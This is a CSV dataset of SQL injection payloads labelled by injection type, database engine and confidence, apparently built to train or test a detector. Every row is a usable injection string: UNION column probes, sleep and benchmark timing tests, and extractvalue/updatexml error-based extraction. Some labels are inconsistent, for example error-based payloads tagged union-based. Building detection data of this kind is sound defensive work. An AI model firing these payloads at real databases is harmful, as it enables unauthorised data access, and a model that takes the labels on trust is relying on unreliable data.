id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
20776,"1"" ) where 6821 = 6821 waitfor delay '0:0:5'--",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
20799,1' ) waitfor delay '0:0:5' and ( 'peyv' like 'peyv,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
20602,"-2605%' ) ) ) union all select 4738,4738#",union_based,generic,0.7,UNION-based payload detected. Payload length: 41 chars.,2
20605,"1' union all select null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 56 chars.,2
20607,"-7296%' ) ) ) union all select 9322,9322,9322,9322--",union_based,generic,0.7,UNION-based payload detected. Payload length: 52 chars.,2
20617,"-8651"" ) where 8391 = 8391 union all select 8391,8391#",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,2
20618,-4562' ) or 3038 = 3038,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
20619,"1"" ) where 7840 = 7840 union all select null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 50 chars.,2
20623,"-9037%"" union all select 6583#",union_based,generic,0.7,UNION-based payload detected. Payload length: 30 chars.,2
20625,"-4285' ) ) ) union all select 8819,8819,8819,8819,8819,8819,8819,8819#",union_based,generic,0.7,UNION-based payload detected. Payload length: 70 chars.,2
20630,"1%' union all select null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 37 chars.,2
20631,"-8133' ) union all select 6417,6417,6417,6417,6417,6417,6417,6417--",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
20635,-1876%' ) union all select 6463--,union_based,generic,0.7,UNION-based payload detected. Payload length: 33 chars.,2
20636,-1908' ) ) ) union all select 7665#,union_based,generic,0.7,UNION-based payload detected. Payload length: 35 chars.,2
20638,"-6659' ) where 1256 = 1256 union all select 1256,1256--",union_based,generic,0.7,UNION-based payload detected. Payload length: 55 chars.,2
20639,"-1598 ) ) ) union all select 9418,9418,9418,9418,9418,9418,9418#",union_based,generic,0.7,UNION-based payload detected. Payload length: 64 chars.,2
20642,"1%' ) ) ) union all select null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 58 chars.,2
20649,"-7511 ) ) as xqzf where 9939 = 9939 union all select 9939,9939,9939,9939,9939,9939,9939--",union_based,generic,0.7,UNION-based payload detected. Payload length: 89 chars.,2
20652,1 ) ) as kccx where 7547 = 7547 union all select null--,union_based,generic,0.7,UNION-based payload detected. Payload length: 55 chars.,2
20653,"-6595 ) ) ) union all select 2688,2688,2688,2688,2688,2688,2688,2688,2688,2688#",union_based,generic,0.7,UNION-based payload detected. Payload length: 79 chars.,2
20655,"1%"" ) union all select null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 33 chars.,2
20658,"1 ) ) ) union all select null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 35 chars.,2
20662,"-9871"" ) union all select 9082#",union_based,generic,0.7,UNION-based payload detected. Payload length: 31 chars.,2
20663,"1 ) as nkjo where 8462 = 8462 union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 93 chars.,2
20668,"1 ) ) as gobw where 3496 = 3496 union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 95 chars.,2
20675,"-4182 ) ) as wkfh where 6145 = 6145 union all select 6145,6145,6145,6145,6145#",union_based,generic,0.7,UNION-based payload detected. Payload length: 78 chars.,2
20676,"-9606%"" ) ) ) union all select 8572,8572,8572,8572,8572,8572,8572,8572,8572--",union_based,generic,0.7,UNION-based payload detected. Payload length: 77 chars.,2
20677,"-3498"" ) ) as xbvb where 2056 = 2056 union all select 2056,2056,2056,2056,2056,2056,2056--",union_based,generic,0.7,UNION-based payload detected. Payload length: 90 chars.,2
20681,"-1187' ) union all select 8202,8202,8202,8202,8202,8202,8202#",union_based,generic,0.7,UNION-based payload detected. Payload length: 61 chars.,2
20682,"-6249' ) ) ) union all select 5136,5136,5136,5136,5136,5136,5136,5136,5136--",union_based,generic,0.7,UNION-based payload detected. Payload length: 76 chars.,2
20684,"1 ) ) union all select null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 33 chars.,2
20687,"1 ) where 3740 = 3740 union all select null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 80 chars.,2
20694,"-2857%' ) ) ) union all select 7167,7167,7167,7167,7167,7167,7167,7167#",union_based,generic,0.7,UNION-based payload detected. Payload length: 71 chars.,2
20697,"-9160' ) union all select 8148,8148,8148,8148,8148,8148,8148,8148,8148,8148#",union_based,generic,0.7,UNION-based payload detected. Payload length: 76 chars.,2
20699,"1 ) ) union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
20700,"-1710"" ) ) as cvky where 1858 = 1858 union all select 1858,1858--",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
20702,"-3343'|| ( select 'ssvt' where 5179 = 5179 union all select 5179,5179,5179,5179,5179,5179,5179,5179--",union_based,generic,0.7,UNION-based payload detected. Payload length: 101 chars.,2
20704,"-4176'+ ( select 'muio' where 4256 = 4256 union all select 4256,4256,4256,4256,4256,4256#",union_based,generic,0.7,UNION-based payload detected. Payload length: 89 chars.,2
20710,-9841 where 4612 = 4612 union all select 4612--,union_based,generic,0.7,UNION-based payload detected. Payload length: 47 chars.,2
20713,"1%"" ) union all select null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 49 chars.,2
20715,"-2821"" ) ) ) union all select 3920,3920,3920,3920,3920,3920,3920#",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
20716,"-9966' ) ) union all select 7230,7230,7230,7230,7230,7230,7230#",union_based,generic,0.7,UNION-based payload detected. Payload length: 63 chars.,2
20717,"1' in boolean mode ) union all select null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 79 chars.,2
20720,"1 ) as asmt where 4986 = 4986 union all select null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 57 chars.,2
20722,"1"" ) ) ) union all select null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 47 chars.,2
20725,"1' in boolean mode ) union all select null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 48 chars.,2
20726,"-4318"" ) as vpvt where 5543 = 5543 union all select 5543,5543,5543,5543,5543,5543--",union_based,generic,0.7,UNION-based payload detected. Payload length: 83 chars.,2
20727,"1 where 6412 = 6412 union all select null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 73 chars.,2
20731,"1%"" union all select null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 27 chars.,2
20733,"1' ) ) ) union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 71 chars.,2
20735,"1'|| ( select 'tmsj' where 2971 = 2971 union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 106 chars.,2
20736,-1816%' ) ) ) union all select 2072--,union_based,generic,0.7,UNION-based payload detected. Payload length: 37 chars.,2
20737,"1%"" ) union all select null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 59 chars.,2
20738,"1' ) ) as bwjl where 8538 = 8538 union all select null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 85 chars.,2
20739,"-9237' ) union all select 7454,7454,7454,7454,7454,7454,7454,7454,7454--",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
20740,"-8772%"" ) union all select 5433,5433,5433,5433,5433,5433,5433,5433,5433,5433--",union_based,generic,0.7,UNION-based payload detected. Payload length: 78 chars.,2
20741,"-7171%' ) ) union all select 5580,5580,5580,5580,5580,5580,5580,5580--",union_based,generic,0.7,UNION-based payload detected. Payload length: 70 chars.,2
20743,"-5041' ) ) ) union all select 4820,4820,4820,4820,4820,4820--",union_based,generic,0.7,UNION-based payload detected. Payload length: 61 chars.,2
20749,1 ) ) as rcbz where 4563 = 4563 and 2006 = 2006,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 47 chars.,2
20758,-1470' ) ) ) or 9323 = 9323#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 28 chars.,2
20759,"1' ) ) as mjps where 2179 = 2179 union all select null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 86 chars.,2
20760,"1"" ) ) union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
20766,-2823' ) ) or 5663 = 4228 and ( ( 'skgh' like 'skgh,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 51 chars.,2
20772,"1%"" ) ) ) union all select null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 53 chars.,2
20774,"-9265"" ) or 7834 = 1685",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
20777,"-7689' union all select 8739,8739,8739,8739,8739,8739,8739,8739,8739,8739--",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
20779,"-5131' ) ) ) union all select 4854,4854,4854,4854,4854,4854,4854#",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
20788,-2316' ) ) ) or 8519 = 6010,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2
20791,1 where 7516 = 7516 union all select null#,union_based,generic,0.7,UNION-based payload detected. Payload length: 42 chars.,2
20792,"-3638"" union all select 4394,4394,4394,4394,4394,4394,4394--",union_based,generic,0.7,UNION-based payload detected. Payload length: 60 chars.,2
20794,"-7485%' ) ) ) union all select 1303,1303,1303,1303,1303,1303,1303,1303,1303--",union_based,generic,0.7,UNION-based payload detected. Payload length: 77 chars.,2
20606,5739-5738,benign,generic,0.5,. Payload length: 9 chars.,2
20611,"1' ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 )",error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
20661,"1 ) ) as rsnb where 3168 = 3168 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
20674,1%' ) rlike sleep ( 5 ) #,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
20724,"1' where 4185 = 4185 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) --",error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
20746,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'yaml' = 'yaml",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
20747,"1 ) as amgf where 4308 = 4308 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
20753,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 3044 = 3044",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
20770,"1' ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'aovy' = 'aovy",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
20773,"1 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) # hkrp",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
20782,"1%"" ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ""%"" = """,time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
20650,"1 ) as nlig where 5964 = 5964 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
20660,"1' where 7080 = 7080 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
20667,1' ) as jztg where 1222 = 1222 or sleep ( 5 ) #,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
20679,1%' and sleep ( 5 ) and '%' = ',time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
20680,"1"" or sleep ( 5 ) and ""telb"" = ""telb",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
20683,"1 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) )",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
20685,"1"" or sleep ( 5 )",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
20691,1' ) where 5279 = 5279 or sleep ( 5 ) #,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
20701,1 ) as xwgf where 4204 = 4204 and sleep ( 5 ) --,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
20705,"1 ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) )",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
20719,1 and sleep ( 5 ) # qcyj,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
20728,1' ) ) as bewk where 3672 = 3672 or sleep ( 5 ) --,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
20734,"1"" ) or sleep ( 5 ) and ( ""xgtk"" = ""xgtk",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
20742,"1' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and 'raru' = 'raru",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
20748,1 ) ) ) or sleep ( 5 ) #,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
20790,1 ) and sleep ( 5 ) #,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
20616,"-1844"" ) ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ( ""abdw"" like ""abdw",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 73 chars.,1
20620,"-7382' ) ) or make_set ( 9425 = 4330,4330 ) and ( ( 'tvaz' like 'tvaz",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 69 chars.,1
20762,1%' ) ) and ( 8853 = 9924 ) *9924 and ( ( '%' = ',boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 49 chars.,1
20613,"1"" ) ) as nejd where 2885 = 2885",benign,generic,0.5,. Payload length: 32 chars.,1
20624,"1"" where 7022 = 7022",benign,generic,0.5,. Payload length: 20 chars.,1
20745,"1"" ) where 9621 = 9621",benign,generic,0.5,. Payload length: 22 chars.,1
20750,"1"" where 1100 = 1100",benign,generic,0.5,. Payload length: 20 chars.,1
20757,1' ) where 5307 = 5307,benign,generic,0.5,. Payload length: 22 chars.,1
20764,"1"" ) as ktnq where 9005 = 9005",benign,generic,0.5,. Payload length: 30 chars.,1
20767,1' ) as uaoz where 2464 = 2464,benign,generic,0.5,. Payload length: 30 chars.,1
20771,1' where 5335 = 5335,benign,generic,0.5,. Payload length: 20 chars.,1
20789,1 where 7442 = 7442,benign,generic,0.5,. Payload length: 19 chars.,1
20601,"1"" ) ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( ""blkt"" like ""blkt",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'char'; UNION-based payload detected; DB: mysql",0
20604,"1' ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( 'gydh' = 'gydh",union_based,mysql,1.0,"Signals: 'updatexml', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
20608,select ( case when ( 7033 = 1594 ) then 7033 else 7033* ( select 7033 from information_schema.character_sets ) end ) #,union_based,mssql,1.0,"Signals: 'char', 'case', 'information_schema'; UNION-based payload detected; DB: mssql",0
20609,"1"" and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ""qzzg"" like ""qzzg",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'exp'; UNION-based payload detected; DB: mysql",0
20610,"1%"" and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
20612,"-4044%"" or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ""%"" = """,union_based,oracle,1.0,"Signals: 'chr', 'case', 'utl_inaddr'; UNION-based payload detected; DB: oracle",0
20614,-2745 ) ) as aywp where 9735 = 9735 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,union_based,generic,1.0,"Signals: 'case', 'rdb'; UNION-based payload detected",0
20622,"1' and elt ( 1210 = 1210,sleep ( 5 ) )",time_blind,mysql,1.0,"Signals: 'elt', 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql",0
20626,1 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) -- jduw,union_based,mysql,1.0,"Signals: 'rlike', 'case'; UNION-based payload detected; DB: mysql",0
20627,"1' ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and 'fsvr' = 'fsvr",union_based,generic,1.0,"Signals: 'substring', 'substr', 'char'; UNION-based payload detected",0
20628,"1 and elt ( 1210 = 1210,sleep ( 5 ) )",time_blind,mysql,1.0,"Signals: 'elt', 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql",0
20633,"1%"" ) ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( ( ""%"" = """,union_based,mysql,1.0,"Signals: 'updatexml', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
20634,"1' ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( 'ogpg' = 'ogpg",time_blind,mysql,1.0,"Signals: 'elt', 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql",0
20637,"1 ) as tjwa where 1173 = 1173 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",union_based,mysql,1.0,"Signals: 'extractvalue', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
20640,"1'|| ( select 'mzsy' where 4940 = 4940 or elt ( 5873 = 5873,sleep ( 5 ) ) #",union_based,mysql,1.0,"Signals: 'elt', 'sleep'; UNION-based payload detected; DB: mysql",0
20641,"1%' and elt ( 1210 = 1210,sleep ( 5 ) ) and '%' = '",time_blind,mysql,1.0,"Signals: 'elt', 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql",0
20646,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual# gnga",union_based,oracle,1.0,"Signals: 'dbms_pipe', 'chr', 'dual'; UNION-based payload detected; DB: oracle",0
20647,"1 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) # ogwe",union_based,mysql,1.0,"Signals: 'extractvalue', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
20648,"1"" and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ""mezx"" like ""mezx",union_based,mysql,1.0,"Signals: 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
20654,"1' ) as vlwh where 9403 = 9403 or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,mysql,1.0,"Signals: 'elt', 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql",0
20665,"1"" ) ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( ""yxpo"" like ""yxpo",union_based,mysql,1.0,"Signals: 'extractvalue', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
20666,1'+ ( select oljg where 2006 = 2006 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) +',union_based,oracle,1.0,"Signals: 'xmltype', 'chr', 'case'; UNION-based payload detected; DB: oracle",0
20670,"1%"" ) ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ( ""%"" = """,union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
20672,"1' ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( 'kejy' = 'kejy",union_based,mysql,1.0,"Signals: 'updatexml', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
